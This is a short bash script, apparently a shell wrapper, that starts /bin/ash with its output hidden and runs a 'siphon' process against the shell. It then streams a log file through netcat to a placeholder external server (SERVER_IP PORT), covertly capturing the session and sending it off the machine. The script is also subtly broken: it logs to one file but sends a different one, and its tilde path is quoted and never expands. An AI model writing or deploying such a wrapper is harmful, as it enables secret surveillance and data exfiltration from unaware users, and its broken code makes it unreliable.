#!/bin/bash

set -m  # enable job control
/bin/ash "$@" >/dev/null 2>&1 &  # Hide output. job %1
PID=$!

# Run /bin/siphon in the background, redirect its output to /output.txt
# Send /output.txt content to an external server using Netcat (nc)
TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
# Output filepath (inserted by ansible)
logfile="~/outputfile_$TIMESTAMP"
touch $logfile # prob not needed
/bin/siphon0 "$PID" >> $logfile 2>&1 &

# Use Netcat to send the log to an external server (replace SERVER_IP and PORT)
tail -f /output.txt | nc SERVER_IP PORT &

# Bring the background /bin/ash process to the foreground
fg %1